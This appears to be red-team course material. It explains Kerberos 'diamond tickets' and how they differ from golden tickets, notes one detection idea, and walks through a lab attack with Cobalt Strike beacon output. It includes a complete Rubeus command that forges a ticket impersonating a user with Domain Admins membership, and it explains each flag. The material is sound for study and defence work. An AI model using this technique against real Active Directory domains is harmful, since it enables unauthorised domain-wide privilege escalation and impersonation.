Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user.  A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use.  Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

Therefore, a possible tactic to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ.  A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.  This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.

First, we prove we have no access to the DC.
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```
  

Diamond tickets can be created with Rubeus.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
```
  

Where:

- `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
- `/ticketuser` is the username of the user to impersonate.
- `/ticketuserid` is the domain RID of that user.
- `/groups` are the desired group RIDs (512 being Domain Admins).
- `/krbkey` is the krbtgt AES256 hash.

  
```
